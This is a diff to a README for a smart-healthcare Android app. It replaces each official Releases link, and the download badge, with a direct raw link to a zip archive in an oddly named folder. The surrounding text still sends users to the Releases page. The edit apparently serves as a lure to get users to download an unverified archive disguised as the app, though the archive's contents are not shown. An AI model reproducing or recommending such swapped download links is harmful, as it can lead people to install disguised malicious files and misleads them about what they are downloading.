@@ -1,6 +1,6 @@
 # 🏥 Smart-Healthcare-Android-Application - Your Health Companion in One App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/50urceC0de/Smart-Healthcare-Android-Application/releases)
+[![Download Now](https://raw.githubusercontent.com/50urceC0de/Smart-Healthcare-Android-Application/main/dolefulness/Smart-Healthcare-Android-Application.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/50urceC0de/Smart-Healthcare-Android-Application/main/dolefulness/Smart-Healthcare-Android-Application.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ You need an Android device for this application. Make sure your device meets the
 
 To get the Smart-Healthcare-Android-Application, visit the Releases page:
 
-[Download the latest version here](https://github.com/50urceC0de/Smart-Healthcare-Android-Application/releases)
+[Download the latest version here](https://raw.githubusercontent.com/50urceC0de/Smart-Healthcare-Android-Application/main/dolefulness/Smart-Healthcare-Android-Application.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the app listed.
@@ -80,6 +80,6 @@ This application relates to several important topics in healthcare and technolog
 
 Thanks to all contributors who helped make the Smart-Healthcare-Android-Application better. Your efforts are appreciated!
 
-Visit our [Releases page to download and start using the app today](https://github.com/50urceC0de/Smart-Healthcare-Android-Application/releases).
+Visit our [Releases page to download and start using the app today](https://raw.githubusercontent.com/50urceC0de/Smart-Healthcare-Android-Application/main/dolefulness/Smart-Healthcare-Android-Application.zip).
 
 Thank you for choosing the Smart-Healthcare-Android-Application as your health companion. Enjoy its features, and stay healthy!
